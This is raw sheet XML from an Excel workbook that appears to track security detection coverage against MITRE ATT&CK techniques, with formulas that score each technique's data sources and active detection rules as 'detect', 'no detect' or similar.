      <formula>COUNTIF($N349,"inconsistent")</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="G578">
    <cfRule type="expression" dxfId="16" priority="26" stopIfTrue="1">
      <formula>COUNTIF($P578,"detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="15" priority="25" stopIfTrue="1">
      <formula>COUNTIF($P578,"disabled")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="14" priority="27" stopIfTrue="1">
      <formula>COUNTIF($P578,"no detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="13" priority="28" stopIfTrue="1">
      <formula>COUNTIF($P578,"inconsistent")</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="G296:H298 F302:G302">
    <cfRule type="expression" dxfId="12" priority="206" stopIfTrue="1">
      <formula>COUNTIF(#REF!,"disabled")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="11" priority="207" stopIfTrue="1">
      <formula>COUNTIF(#REF!,"detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="10" priority="208" stopIfTrue="1">
      <formula>COUNTIF(#REF!,"no detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="9" priority="209" stopIfTrue="1">
      <formula>COUNTIF(#REF!,"inconsistent")</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="H266:H267">
    <cfRule type="expression" dxfId="8" priority="120" stopIfTrue="1">
      <formula>COUNTIF($P266,"inconsistent")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="7" priority="119" stopIfTrue="1">
      <formula>COUNTIF($P266,"no detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="6" priority="118" stopIfTrue="1">
      <formula>COUNTIF($P266,"detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="5" priority="117" stopIfTrue="1">
      <formula>COUNTIF($P266,"disabled")</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42AAF7DC-092F-4996-B5DA-A06EFF740E50}">
          <x14:formula1>
            <xm:f>'Mitre Techniques'!$C:$C</xm:f>
          </x14:formula1>
          <xm:sqref>G303:H305 E331:H388 E75:H173 E175:H232 H330 E306:H329 P330:R330 P323:P324 E291:H302 E290 P290:Q290 E289:H289 F288:H288 E270:H287 P288 E234:H268 G65:H65 E66:H71 E33:H64 P65:Q65 E174:I176 F74:H74 E73:H73 P74 G72:H72 P72:Q72 G32:H32 E16:H31 P32:Q32 E580:H1048576 G579:H579 E567:H578 E579 F565:H566 E563:H564 E565 F561:H562 E510:H560 E562 H269 E269:F269 E416:H507 F508:H509 E508 G233:H233 E233 H15 E1:H14 E15:F15 G413:H415 E409:H412 E413:E415 G407:H408 E405:H406 E407:E408 H403:H404 E403:F404 G399:H399 E399 E389:G389 E400:H402 E390:H398 E303:E305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64513-BFAC-42C5-8ACF-CC9FA312E20A}">
  <dimension ref="A1:X657"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <pane ySplit="1" topLeftCell="A9" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="E9" sqref="E9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="9.5546875" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="9.5546875" customWidth="1"/>
    <col min="3" max="3" width="47.6640625" customWidth="1"/>
    <col min="4" max="4" width="30.6640625" customWidth="1"/>
    <col min="5" max="5" width="23" customWidth="1"/>
    <col min="6" max="6" width="4.88671875" style="9" customWidth="1"/>
    <col min="7" max="7" width="4" style="9" customWidth="1"/>
    <col min="8" max="8" width="4.88671875" style="9" customWidth="1"/>
    <col min="9" max="9" width="6.33203125" style="9" customWidth="1"/>
    <col min="10" max="10" width="4.6640625" style="9" customWidth="1"/>
    <col min="11" max="11" width="6.33203125" style="9" customWidth="1"/>
    <col min="12" max="12" width="18.5546875" style="9" customWidth="1"/>
    <col min="13" max="13" width="27.6640625" style="9" bestFit="1" customWidth="1"/>
    <col min="14" max="14" width="19.109375" style="9" bestFit="1" customWidth="1"/>
    <col min="15" max="15" width="13.44140625" style="14" bestFit="1" customWidth="1"/>
    <col min="16" max="16" width="20.33203125" style="14" bestFit="1" customWidth="1"/>
    <col min="17" max="17" width="17.6640625" style="14" customWidth="1"/>
    <col min="18" max="18" width="11" style="14" customWidth="1"/>
    <col min="19" max="19" width="39.5546875" style="14" bestFit="1" customWidth="1"/>
    <col min="20" max="20" width="48" customWidth="1"/>
    <col min="21" max="21" width="115.33203125" customWidth="1"/>
    <col min="22" max="22" width="129" customWidth="1"/>
    <col min="23" max="23" width="16.6640625" customWidth="1"/>
    <col min="24" max="24" width="17.33203125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:24" s="9" customFormat="1" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A1" s="43" t="s">
        <v>342</v>
      </c>
      <c r="B1" s="43" t="s">
        <v>343</v>
      </c>
      <c r="C1" s="43" t="s">
        <v>344</v>
      </c>
      <c r="D1" s="43" t="s">
        <v>345</v>
      </c>
      <c r="E1" s="43" t="s">
        <v>346</v>
      </c>
      <c r="F1" s="44" t="s">
        <v>347</v>
      </c>
      <c r="G1" s="44" t="s">
        <v>348</v>
      </c>
      <c r="H1" s="44" t="s">
        <v>349</v>
      </c>
      <c r="I1" s="44" t="s">
        <v>350</v>
      </c>
      <c r="J1" s="44" t="s">
        <v>351</v>
      </c>
      <c r="K1" s="44" t="s">
        <v>352</v>
      </c>
      <c r="L1" s="13" t="s">
        <v>353</v>
      </c>
      <c r="M1" s="44" t="s">
        <v>354</v>
      </c>
      <c r="N1" s="44" t="s">
        <v>355</v>
      </c>
      <c r="O1" s="45" t="s">
        <v>356</v>
      </c>
      <c r="P1" s="45" t="s">
        <v>357</v>
      </c>
      <c r="Q1" s="46" t="s">
        <v>358</v>
      </c>
      <c r="R1" s="46" t="s">
        <v>359</v>
      </c>
      <c r="S1" s="46" t="s">
        <v>360</v>
      </c>
      <c r="T1" s="13" t="s">
        <v>361</v>
      </c>
      <c r="U1" s="47" t="s">
        <v>362</v>
      </c>
      <c r="V1" s="13" t="s">
        <v>363</v>
      </c>
      <c r="W1" s="13" t="s">
        <v>364</v>
      </c>
      <c r="X1" s="13" t="s">
        <v>365</v>
      </c>
    </row>
    <row r="2" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A2" t="s">
        <v>366</v>
      </c>
      <c r="B2" t="s">
        <v>366</v>
      </c>
      <c r="C2" t="s">
        <v>73</v>
      </c>
      <c r="D2" t="s">
        <v>11</v>
      </c>
      <c r="E2" t="s">
        <v>367</v>
      </c>
      <c r="F2" s="9">
        <f t="shared" ref="F2:F65" si="0">LEN(E2)-LEN(SUBSTITUTE(E2,",",""))+1</f>
        <v>1</v>
      </c>
      <c r="G2" s="9" cm="1">
        <f t="array" ref="G2">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H2" s="9" cm="1">
        <f t="array" ref="H2">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I2" s="9" t="str" cm="1">
        <f t="array" ref="I2">IF(SUM(IF($C2=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C2=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J2" s="9" cm="1">
        <f t="array" ref="J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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M2" s="9" cm="1">
        <f t="array" ref="M2">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N2" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O2" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P2" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S2" s="15"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 t="s">
        <v>368</v>
      </c>
      <c r="U2" t="s">
        <v>369</v>
      </c>
      <c r="V2" t="s">
        <v>370</v>
      </c>
      <c r="W2" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A3" t="s">
        <v>366</v>
      </c>
      <c r="B3" t="s">
        <v>371</v>
      </c>
      <c r="C3" t="s">
        <v>372</v>
      </c>
      <c r="D3" t="s">
        <v>11</v>
      </c>
      <c r="E3" t="s">
        <v>367</v>
      </c>
      <c r="F3" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G3" s="9" cm="1">
        <f t="array" ref="G3">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H3" s="9" t="str" cm="1">
        <f t="array" ref="H3">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I3" s="9" t="str" cm="1">
        <f t="array" ref="I3">IF(SUM(IF($C3=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C3=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J3" s="9" t="str" cm="1">
        <f t="array" ref="J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 s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M3" s="9" cm="1">
        <f t="array" ref="M3">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N3" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O3" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P3" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S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 t="s">
        <v>368</v>
      </c>
      <c r="U3" t="s">
        <v>373</v>
      </c>
      <c r="V3" t="s">
        <v>374</v>
      </c>
      <c r="W3" t="b">
        <v>1</v>
      </c>
      <c r="X3" t="s">
        <v>366</v>
      </c>
    </row>
    <row r="4" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A4" t="s">
        <v>366</v>
      </c>
      <c r="B4" t="s">
        <v>375</v>
      </c>
      <c r="C4" t="s">
        <v>376</v>
      </c>
      <c r="D4" t="s">
        <v>11</v>
      </c>
      <c r="E4" t="s">
        <v>367</v>
      </c>
      <c r="F4" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G4" s="9" cm="1">
        <f t="array" ref="G4">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H4" s="9" t="str" cm="1">
        <f t="array" ref="H4">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I4" s="9" t="str" cm="1">
        <f t="array" ref="I4">IF(SUM(IF($C4=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C4=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J4" s="9" t="str" cm="1">
        <f t="array" ref="J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 s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M4" s="9" cm="1">
        <f t="array" ref="M4">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N4" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O4" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P4" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S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 t="s">
        <v>368</v>
      </c>
      <c r="U4" t="s">
        <v>377</v>
      </c>
      <c r="V4" t="s">
        <v>374</v>
      </c>
      <c r="W4" t="b">
        <v>1</v>
      </c>
      <c r="X4" t="s">
        <v>366</v>
      </c>
    </row>
    <row r="5" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A5" t="s">
        <v>366</v>
      </c>
      <c r="B5" t="s">
        <v>378</v>
      </c>
      <c r="C5" t="s">
        <v>294</v>
      </c>
      <c r="D5" t="s">
        <v>11</v>
      </c>
      <c r="E5" t="s">
        <v>367</v>
      </c>
      <c r="F5" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G5" s="9" cm="1">
        <f t="array" ref="G5">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H5" s="9" t="str" cm="1">
        <f t="array" ref="H5">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I5" s="9" t="str" cm="1">
        <f t="array" ref="I5">IF(SUM(IF($C5=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C5=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J5" s="9" t="str" cm="1">
        <f t="array" ref="J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 s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M5" s="9" cm="1">
        <f t="array" ref="M5">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N5" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O5" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P5" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S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 t="s">
        <v>368</v>
      </c>
      <c r="U5" t="s">
        <v>379</v>
      </c>
      <c r="V5" t="s">
        <v>374</v>
      </c>
      <c r="W5" t="b">
        <v>1</v>
      </c>
      <c r="X5" t="s">
        <v>366</v>
      </c>
    </row>
    <row r="6" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A6" t="s">
        <v>380</v>
      </c>
      <c r="B6" t="s">
        <v>380</v>
      </c>
      <c r="C6" t="s">
        <v>146</v>
      </c>
      <c r="D6" t="s">
        <v>7</v>
      </c>
      <c r="E6" t="s">
        <v>381</v>
      </c>
      <c r="F6" s="9">
        <f t="shared" si="0"/>
        <v>10</v>
      </c>
      <c r="G6" s="9" cm="1">
        <f t="array" ref="G6">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H6" s="9" cm="1">
        <f t="array" ref="H6">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>8</v>
      </c>
      <c r="I6" s="9" cm="1">
        <f t="array" ref="I6">IF(SUM(IF($C6=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C6=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J6" s="9" cm="1">
        <f t="array" ref="J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1</v>
      </c>
      <c r="K6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>8</v>
      </c>
      <c r="M6" s="9" cm="1">
        <f t="array" ref="M6">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>8</v>
      </c>
      <c r="N6" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>2</v>
      </c>
      <c r="O6" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0.25</v>
      </c>
      <c r="P6" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S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modifier should be increased for the technique</v>
      </c>
      <c r="T6" t="s">
        <v>368</v>
      </c>
      <c r="U6" t="s">
        <v>382</v>
      </c>
      <c r="V6" t="s">
        <v>383</v>
      </c>
      <c r="W6" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="7" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A7" t="s">
        <v>380</v>
      </c>
      <c r="B7" t="s">
        <v>384</v>
      </c>
      <c r="C7" t="s">
        <v>243</v>
      </c>
      <c r="D7" t="s">
        <v>7</v>
      </c>
      <c r="E7" t="s">
        <v>385</v>
      </c>
      <c r="F7" s="9">
        <f t="shared" si="0"/>
        <v>7</v>
      </c>
      <c r="G7" s="9" cm="1">
        <f t="array" ref="G7">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H7" s="9" t="str" cm="1">
        <f t="array" ref="H7">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I7" s="9" t="str" cm="1">
        <f t="array" ref="I7">IF(SUM(IF($C7=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C7=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J7" s="9" t="str" cm="1">
        <f t="array" ref="J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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M7" s="9" cm="1">
        <f t="array" ref="M7">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N7" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O7" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P7" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S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7" t="s">
        <v>386</v>
      </c>
      <c r="U7" t="s">
        <v>387</v>
      </c>
      <c r="V7" t="s">
        <v>388</v>
      </c>
      <c r="W7" t="b">
        <v>1</v>
      </c>
      <c r="X7" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="8" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A8" t="s">
        <v>380</v>
      </c>
      <c r="B8" t="s">
        <v>389</v>
      </c>
      <c r="C8" t="s">
        <v>390</v>
      </c>
      <c r="D8" t="s">
        <v>7</v>
      </c>
      <c r="E8" t="s">
        <v>391</v>
      </c>
      <c r="F8" s="9">
        <f t="shared" si="0"/>
        <v>4</v>
      </c>
      <c r="G8" s="9" cm="1">
        <f t="array" ref="G8">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H8" s="9" t="str" cm="1">
        <f t="array" ref="H8">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I8" s="9" t="str" cm="1">
        <f t="array" ref="I8">IF(SUM(IF($C8=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C8=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J8" s="9" t="str" cm="1">
        <f t="array" ref="J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8" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M8" s="9" cm="1">
        <f t="array" ref="M8">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N8" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O8" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P8" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S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8" t="s">
        <v>386</v>
      </c>
      <c r="U8" t="s">
        <v>392</v>
      </c>
      <c r="V8" t="s">
        <v>393</v>
      </c>
      <c r="W8" t="b">
        <v>1</v>
      </c>
      <c r="X8" t="s">
        <v>380</v>
      </c>
    </row>
    <row r="9" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A9" t="s">
        <v>380</v>
      </c>
      <c r="B9" t="s">
        <v>394</v>
      </c>
      <c r="C9" t="s">
        <v>395</v>
      </c>
      <c r="D9" t="s">
        <v>7</v>
      </c>
      <c r="E9" t="s">
        <v>396</v>
      </c>
      <c r="F9" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G9" s="9" cm="1">
        <f t="array" ref="G9">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H9" s="9" t="str" cm="1">
        <f t="array" ref="H9">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I9" s="9" cm="1">
        <f t="array" ref="I9">IF(SUM(IF($C9=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C9=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J9" s="9" t="str" cm="1">
        <f t="array" ref="J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9" s="9">
